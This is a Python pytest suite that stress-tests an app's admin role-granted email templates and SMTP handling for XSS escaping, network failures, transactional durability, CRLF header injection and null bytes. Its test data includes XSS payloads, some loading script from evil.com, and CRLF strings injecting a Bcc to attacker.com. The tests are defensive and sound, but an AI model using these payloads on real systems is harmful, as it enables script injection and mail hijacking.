"""Milestone 3 / M5 Adversarial Empirical Challenge Suite: Backend Email & Resilience.

Authored by Challenger m3_1.
Empirically stress-tests:
1. Extreme XSS, HTML injection, and Header Injection payloads in Admin Role email templates.
2. Null bytes, surrogate pairs, huge payloads (50KB+), and Unicode/RTL edge cases.
3. SMTP mid-stream disconnects, sudden EOF, socket timeouts, and SSL handshake resets.
4. Transactional integrity of role updates in PostgreSQL when SMTP connection abruptly drops.
"""

from __future__ import annotations

import smtplib
import ssl
import uuid
from unittest.mock import AsyncMock, patch

import pytest

from app.services.email_service import (
    _build_admin_role_granted_html,
    _build_admin_role_granted_plain,
    _send_smtp_sync,
    is_valid_email,
)

DEMO_PASSWORD = "DemoPass123!"


def _login(client, username: str, password: str = DEMO_PASSWORD) -> dict[str, str]:
    r = client.post("/auth/login", data={"username": username, "password": password})
    assert r.status_code == 200, r.text
    return {"Authorization": f"Bearer {r.json()['access_token']}"}


def _idem(headers: dict[str, str]) -> dict[str, str]:
    return {**headers, "Idempotency-Key": str(uuid.uuid4())}


class TestExtremeXssAndPayloads:
    """Stress test template generators with adversarial payloads."""

    @pytest.mark.parametrize(
        "xss_vector",
        [
            "<script>alert(document.cookie)</script>",
            '"><script src="//evil.com/x.js"></script>',
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert(1)>",
            '"><svg onload=alert(1)>',
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/'/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
            "<iframe src=\"javascript:alert(1)\"></iframe>",
            '<body onload="alert(1)">',
            "<style>body{display:none} @import 'http://evil.com/xss.css';</style>",
            "';alert(String.fromCharCode(88,83,83))//",
            '"><input autofocus onfocus=alert(1)>',
            "<details open ontoggle=alert(1)>",
            "<select autofocus onfocus=alert(1)><option>1</option></select>",
        ],
    )
    def test_html_template_neutralizes_all_xss_vectors(self, xss_vector):
        """Every single vector must have raw < and > escaped and never appear unescaped."""
        html_out = _build_admin_role_granted_html(
            username=f"user_{xss_vector}",
            to_email=f"victim_{xss_vector}@bankops.vn",
            display_name=f"Name {xss_vector}",
            new_roles=[f"role_{xss_vector}"],
            granted_by_username=f"granter_{xss_vector}",
            granted_at_str=f"time_{xss_vector}",
            app_url="https://app.khotrasua.vn",
        )

        from html.parser import HTMLParser

        class XssAuditParser(HTMLParser):
            def __init__(self):
                super().__init__()
                self.illegal_tags = []
                self.event_handlers = []

            def handle_starttag(self, tag, attrs):
                if tag.lower() in {"script", "img", "svg", "iframe", "style", "details", "select", "input", "object", "embed"}:
                    self.illegal_tags.append(tag)
                for attr_name, _ in attrs:
                    if attr_name.lower().startswith("on"):
                        self.event_handlers.append((tag, attr_name))

        parser = XssAuditParser()
        parser.feed(html_out)

        # ORACLE: Zero injected tags or event handlers were parsed by the HTML parser
        assert len(parser.illegal_tags) == 0, f"Injected executable tags found: {parser.illegal_tags}"
        assert len(parser.event_handlers) == 0, f"Injected event handler attributes found: {parser.event_handlers}"

        # Furthermore, the raw unescaped vector must never exist in the HTML output
        assert xss_vector not in html_out

    def test_extreme_payload_length_and_memory_stability(self):
        """50,000 characters in display_name and 500 roles must render without memory spike or crash."""
        huge_name = "A" * 50_000
        huge_roles = [f"custom_role_{i}" for i in range(500)]

        html_out = _build_admin_role_granted_html(
            username="huge_user",
            to_email="huge@bankops.vn",
            display_name=huge_name,
            new_roles=huge_roles,
            granted_by_username="root",
            granted_at_str="2026-11-02",
            app_url="https://app.khotrasua.vn",
        )
        assert len(html_out) > 50_000
        assert "custom_role_499" in html_out

        plain_out = _build_admin_role_granted_plain(
            username="huge_user",
            to_email="huge@bankops.vn",
            display_name=huge_name,
            new_roles=huge_roles,
            granted_by_username="root",
            granted_at_str="2026-11-02",
            app_url="https://app.khotrasua.vn",
        )
        assert len(plain_out) > 50_000

    def test_unicode_and_bidirectional_text_handling(self):
        """Right-to-left (Arabic/Hebrew), complex emoji clusters, Vietnamese diacritics."""
        arabic_name = "مرحبا بالعالم 👑 Administrator ☕ Trà Sữa Đậm Vị"
        emoji_roles = ["Quản Trị 🛡️", "Kho Hàng 📦", "Két Sắt 💰"]

        html_out = _build_admin_role_granted_html(
            username="arabic_user",
            to_email="arabic@bankops.vn",
            display_name=arabic_name,
            new_roles=emoji_roles,
            granted_by_username="admin_vn",
            granted_at_str="12:00:00 02/11/2026",
            app_url="https://app.khotrasua.vn",
        )
        assert "مرحبا بالعالم" in html_out
        assert "🛡️" in html_out
        assert "📦" in html_out


class TestSmtpDisconnectAndNetworkDrops:
    """Stress test SMTP network interruptions and socket disconnects."""

    @pytest.mark.parametrize(
        ("disconnect_exception", "description"),
        [
            (smtplib.SMTPServerDisconnected("Remote host closed connection during DATA phase"), "Mid-DATA server disconnect"),
            (smtplib.SMTPConnectError(421, b"4.3.2 Service unavailable, closing channel"), "Initial connection rejected"),
            (TimeoutError("Socket read timed out after 12s"), "TCP socket timeout"),
            (BrokenPipeError(32, "Broken pipe"), "Broken pipe on write"),
            (ConnectionResetError(54, "Connection reset by peer"), "RST packet from remote peer"),
            (ssl.SSLEOFError(8, "EOF occurred in violation of protocol"), "Sudden TLS socket termination"),
            (smtplib.SMTPResponseException(451, b"Requested action aborted: local error in processing"), "SMTP 451 temporary failure"),
            (smtplib.SMTPResponseException(554, b"Transaction failed: relay access denied"), "SMTP 554 relay denied"),
        ],
    )
    def test_send_smtp_sync_absorbs_all_socket_exceptions(self, disconnect_exception, description):
        """_send_smtp_sync MUST catch any network/socket/SSL failure, return (False, msg), and never raise."""
        with patch("smtplib.SMTP") as mock_smtp_cls:
            mock_server = mock_smtp_cls.return_value.__enter__.return_value
            # Trigger exception on starttls or send_message
            mock_server.send_message.side_effect = disconnect_exception

            ok, msg = _send_smtp_sync(
                host="smtp.bankops.vn",
                port=587,
                user="noreply@bankops.vn",
                password="password",
                to_email="user@bankops.vn",
                subject="Test Disconnect",
                html_content="<p>Test</p>",
                plain_text_content="Test",
                from_name="BankOps",
            )
            assert ok is False, f"Failed to report failure for {description}"
            assert msg != "", f"Empty message for {description}"

    def test_endpoint_transaction_committed_when_smtp_socket_drops(self, client):
        """When an admin promotes a user and SMTP abruptly disconnects with SMTPServerDisconnected,
        the database commit must be 100% durable, user role upgraded in PostgreSQL, and API return 200 OK.
        """
        admin_auth = _login(client, "demo_admin")
        username = f"drop_{uuid.uuid4().hex[:8]}"

        # 1. Create employee
        create_res = client.post(
            "/admin/users",
            headers=_idem(admin_auth),
            json={
                "username": username,
                "display_name": f"Drop Test {username}",
                "roles": ["staff"],
                "onboarding_method": "temporary_password",
                "email": f"{username}@bankops.vn",
            },
        )
        assert create_res.status_code == 201
        user_id = create_res.json()["user"]["id"]

        # 2. Promote to admin while simulating SMTPServerDisconnected
        with patch("app.api.routes.admin_users.send_admin_role_granted_email", new_callable=AsyncMock) as mock_send:
            mock_send.side_effect = smtplib.SMTPServerDisconnected("Remote SMTP server abruptly terminated socket during TLS")

            res = client.put(
                f"/admin/users/{user_id}/roles",
                headers=_idem(admin_auth),
                json={"roles": ["admin"]},
            )
            # The HTTP response must not be 500 or broken
            assert res.status_code == 200, f"Expected 200 OK despite SMTP disconnect, got {res.status_code}: {res.text}"
            assert "admin" in res.json()["user"]["roles"]

        # 3. Read directly from DB to verify persistence
        verify_res = client.get(f"/admin/users?search={username}", headers=admin_auth)
        assert verify_res.status_code == 200
        users = [u for u in verify_res.json()["users"] if u["id"] == user_id]
        assert len(users) == 1
        assert "admin" in users[0]["roles"]


class TestHeaderInjectionAndNullBytes:
    """Challenge SMTP against CRLF header injection and null byte corruption."""

    @pytest.mark.parametrize(
        "crlf_payload",
        [
            "victim@bankops.vn\r\nBcc: evil@attacker.com",
            "victim@bankops.vn\nBcc: evil@attacker.com",
            "victim@bankops.vn\r\nSubject: Injected Subject",
            "victim@bankops.vn\r\n\r\nEvil Body Payload",
        ],
    )
    def test_crlf_in_recipient_email_rejected_or_handled_safely(self, crlf_payload):
        """CRLF inside to_email must be rejected by is_valid_email or absorbed by _send_smtp_sync without raising."""
        # 1. Validation check
        valid = is_valid_email(crlf_payload)
        assert valid is False, f"is_valid_email must reject CRLF injection: {crlf_payload!r}"

        # 2. Even if passed directly to _send_smtp_sync, it must never raise an unhandled exception
        ok, msg = _send_smtp_sync(
            host="smtp.bankops.vn",
            port=587,
            user="noreply@bankops.vn",
            password="pwd",
            to_email=crlf_payload,
            subject="Safe Subject",
            html_content="<p>Test</p>",
            plain_text_content="Test",
        )
        assert ok is False

    def test_null_bytes_in_template_inputs(self):
        """Null bytes \x00 should not crash the template generators."""
        html_out = _build_admin_role_granted_html(
            username="user\x00hacker",
            to_email="test\x00@bankops.vn",
            display_name="Display\x00Name",
            new_roles=["admin\x00role"],
            granted_by_username="root\x00admin",
            granted_at_str="2026-11-02",
            app_url="https://app.khotrasua.vn",
        )
        assert "Display\x00Name" in html_out or "DisplayName" in html_out

